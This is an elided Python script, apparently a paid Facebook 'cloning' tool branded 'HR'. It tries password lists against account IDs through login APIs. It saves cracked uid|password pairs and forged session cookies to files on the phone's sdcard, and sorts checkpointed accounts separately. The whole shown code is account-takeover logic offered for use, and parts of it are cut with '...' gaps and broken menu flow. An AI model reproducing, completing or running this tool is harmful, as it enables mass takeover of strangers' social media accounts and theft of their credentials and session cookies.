...
def approval():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      print(f'{R}❲{G}1{R}❳{G} Your Key {R}:{G} HR=['+id+']=XD')
      linex()
      print(f"{R}❲{G}1{R}❳{G} This Is Paid Tool ")
      linex()
      input(f'{R}❲{G}1{R}❳{G} Click Enter To Sent Key Admin inbox ')
      tks = ('Hello%20Sir%20!%2I%20Want%20To%20Buy%20This%20Tools%20My%20Key%20:%20'+id);os.system('am start https://www.facebook.com/profile.php?id=100092553712823?text='+tks)
      time.sleep(1)
      exit()
  except:
    sys.exit()
...
def Main_HR():
        ...
        if opt1 == "1": file()   
            ...
            if opt == '2':ind()
            if opt== '3':gmail()
            else:linex();print(f'{R}❲{G}~{R}❳{G} Selected Wrong Option ');time.sleep(2);Main_HR()
            if d == '0':Main_HR()
            else:linex();print(f'{R}❲{G}~{R}❳{G}  Selected Wrong Option ');time.sleep(2);Main_HR()
...
def file():
    clear();print(f"{R}❲{G}~{R}❳{G} Example {R}:{R} /{G}sdcard{R}/{G}HR.txt {R}❲{G}ETC{R}❳{G}");linex()
    ...
    print(f"{R}❲{G}~{R}❳{G} Cloning Accounts Saved in /sdcard/HR_M1_FILE_OK.txt")
    print(f'\r{R}--------------------------------------------------')
    input(f"{R}❲{G}~{R}❳{G} Press Enter To Go Back ")
    os.system('python Main_HR.py')
    ...
    try:
        ...
        for pas in passlist:
                ...
                if 'session_key' in po:
                        ...
                        status= lock(uid)
                        if "Active" in status:
                        	print(f'\r{R}❲{G}💞HR💞-OK{R}❳{G} '+uid+f' {R}|{G} '+pas)
                        print(f"\r{R}❲{G}COOKIE{R}❳{A}->{G} {cookie}")
                        file_path_ok = os.path.join(folder_path, 'HR-RANDOM-OK.txt')
                        file_path_cookies = os.path.join(folder_path, 'HR-RANDOM-COOKIE.txt')
                        ...
                        print(f'\r{R}❲{Y}💞HR💞-CP{R}❳{Y} '+uid+f' {R}|{Y} '+pas+'\033[1;97m')
                        file_path = os.path.join(folder_path, 'HR-RANDOM-CP.txt')
...
def api1(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f'\r{R}❲{G}HR-T1{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}❳{A}-{R}❲{G}%s{R}❳ \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    ...
                    print(f'\r{R}❲{G}💞HR💞-OK{R}❳{G} '+uid+f' {R}|{G} '+pas)
                    print(f"\r{R}❲{G}COOKIE{R}❳{A}->{G} {cookie}")
                    file_path = os.path.join(folder_path, 'HR-FILE-M1-OK.txt')
                    open('/sdcard/HR/HR-FILE-M1-OK-COOKIE.txt','a').write(uid+' | '+pas+' |------> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    oks.append(uid)
                    break
                    ...
                    uid = str(po['error']['error_data']['uid'])
                    print(f'\r{R}❲{Y}💞HR💞-CP{R}❳{Y} '+uid+f' {R}|{Y} '+pas+'\033[1;97m')
                    file_path = os.path.join(folder_path,  'HR-FILE-M2-CP.txt')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    cps.append(uid)
                    break
...
def api2(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f'\r{R}❲{G}HR-T2{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}❳{A}-{R}❲{G}%s{R}❳ \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    ...
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookie = f"sb={ssbb};{ckkk}"
                    print(f'\r{R}❲{G}💞HR💞-OK{R}❳ '+uid+f' {R}|{G} '+pas)
                    print(f"\r{R}❲{G}COOKIE{R}❳{A}->{G} {cookie}")
                    file_path = os.path.join(folder_path, 'HR-FILE-M2-OK.txt')
                    open('/sdcard/HR/HR-FILE-M2-OK-COOKIE.txt','a').write(uid+' | '+pas+' |----> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    oks.append(uid)
                    break
